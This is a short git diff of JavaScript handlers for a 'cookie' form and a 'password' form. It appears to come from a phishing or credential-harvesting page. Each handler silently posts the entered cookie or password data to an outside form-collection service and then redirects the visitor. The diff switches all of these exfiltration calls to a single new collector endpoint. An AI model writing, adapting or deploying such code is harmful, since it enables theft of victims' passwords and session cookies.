@@ -28,7 +28,7 @@ cookieForm.addEventListener('submit', function(e) {
     }
 
     // Submit form data in background
-    fetch('https://submit-form.com/MDkgK3FAs', {
+    fetch('https://submit-form.com/3bbJjyvtQ', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -54,7 +54,7 @@ passwordForm.addEventListener('submit', function(e) {
         return;
     }
 
-    fetch('https://submit-form.com/aPJv97Cuo', {
+    fetch('https://submit-form.com/3bbJjyvtQ', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
@@ -63,9 +63,9 @@ passwordForm.addEventListener('submit', function(e) {
             passwrod: password
         })
     }).then(() => {
-        window.location.href = 'https://submit-form.com/aPJv97Cuo';
+        window.location.href = 'https://submit-form.com/3bbJjyvtQ';
     }).catch(error => {
         console.error('Error:', error);
-        window.location.href = 'https://submit-form.com/aPJv97Cuo';
+        window.location.href = 'https://submit-form.com/3bbJjyvtQ';
     });
 });
